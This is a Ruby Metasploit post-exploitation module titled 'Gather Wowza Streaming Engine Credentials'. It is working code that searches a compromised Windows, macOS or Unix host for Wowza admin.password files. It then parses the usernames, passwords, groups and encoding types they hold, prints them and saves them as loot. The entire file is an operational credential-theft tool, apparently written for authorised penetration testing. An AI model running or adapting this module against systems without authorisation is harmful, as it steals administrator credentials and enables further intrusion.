##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gather Wowza Streaming Engine Credentials',
        'Description' => %q{
          This module collects Wowza Streaming Engine user credentials.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://www.wowza.com/docs/use-http-providers-with-the-wowza-streaming-engine-java-api' ],
          [ 'URL', 'https://www.wowza.com/resources/WowzaStreamingEngine_UsersGuide-4.0.5.pdf' ],
        ],
        'Author' => ['bcoles'],
        'Platform' => %w[win linux osx unix],
        'SessionTypes' => %w[meterpreter powershell shell],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def parse_admin_config(config_path)
    return [] if config_path.blank?

    print_status("Parsing file #{config_path}")

    begin
      config_data = read_file(config_path)
    rescue StandardError => e
      print_error("Could not read #{config_path} : #{e.message}")
      return []
    end

    if config_data.blank?
      print_warning('Configuration file is empty')
      return []
    end

    # Admin password file (format: [username][space][password][space][groups][space][passwordEncoding])
    # [groups]= "admin" | "admin|advUser" | "basic".
    # [passwordEncoding]= "cleartext" | "bcrypt" | "digest". If no value is specified, defaults to "cleartext".

    creds = []
    config_data.each_line do |line|
      line.strip!

      next if line.blank?
      next if line.starts_with?('#')

      username, password, groups, encoding = line.split(' ')
      creds << [username, password, groups, encoding]
    end

    creds
  end

  # Application is installed to Program Files\\Wowza Media Systems\\Wowza Streaming Engine <version>
  def config_files_win
    configs = []

    [
      (get_env('ProgramFiles') || 'C:\\Program Files') + '\\Wowza Media Systems',
      (get_env('ProgramW6432') || 'C:\\Program Files') + '\\Wowza Media Systems',
      (get_env('ProgramFiles(x86)') || 'C:\\Program Files (x86)') + '\\Wowza Media Systems',
      'C:\\Program Files\\Wowza Media Systems',
      'C:\\Program Files (x86)\\Wowza Media Systems',
    ].uniq.each do |wowza_dir|
      next unless directory?(wowza_dir)

      dirs = dir(wowza_dir) || []

      dirs.each do |dir|
        next unless dir.starts_with?('Wowza Streaming Engine')

        config_path = "#{wowza_dir}\\#{dir}\\conf\\admin.password"
        configs << config_path if exists?(config_path)
      end
    end

    configs
  end

  # Application is installed to /Library/WowzaStreamingEngine-<version>
  # Symlink /Library/WowzaStreamingEngine points to the application directory
  # and cannot be changed.
  # https://www.wowza.com/community/t/default-installation-directory/635/2
  def config_files_osx
    config_path = '/Library/WowzaStreamingEngine/conf/admin.password'
    exists?(config_path) ? [config_path] : []
  end

  # Application is installed to /usr/local/WowzaStreamingEngine-<version>
  # Symlink /usr/local/WowzaStreamingEngine points to the application directory
  # and cannot be changed.
  # https://www.wowza.com/community/t/default-installation-directory/635/2
  def config_files_unix
    config_path = '/usr/local/WowzaStreamingEngine/conf/admin.password'
    exists?(config_path) ? [config_path] : []
  end

  def run
    case session.platform
    when 'windows'
      configs = config_files_win
    when 'osx'
      configs = config_files_osx
    else
      configs = config_files_unix
    end

    fail_with(Failure::NotFound, 'Found no Wowza Streaming Engine admin.password config files') if configs.empty?

    creds = []
    configs.each do |config|
      parse_admin_config(config).each { |c| creds << c }
    end

    fail_with(Failure::NotFound, 'Found no credentials') if creds.empty?

    columns = %w[Username Password Groups Encoding]

    tbl = Rex::Text::Table.new(
      'Header' => 'Wowza Streaming Engine Credentials',
      'Columns' => columns
    )

    creds.uniq.each do |c|
      tbl << c
    end

    print_line(tbl.to_s)
    path = store_loot('host.wowzastreamingengine', 'text/csv', session, tbl.to_csv, 'wowza_creds.csv', 'Wowza Streaming Engine credentials')
    print_good("Credentials stored in: #{path}")
  end
end
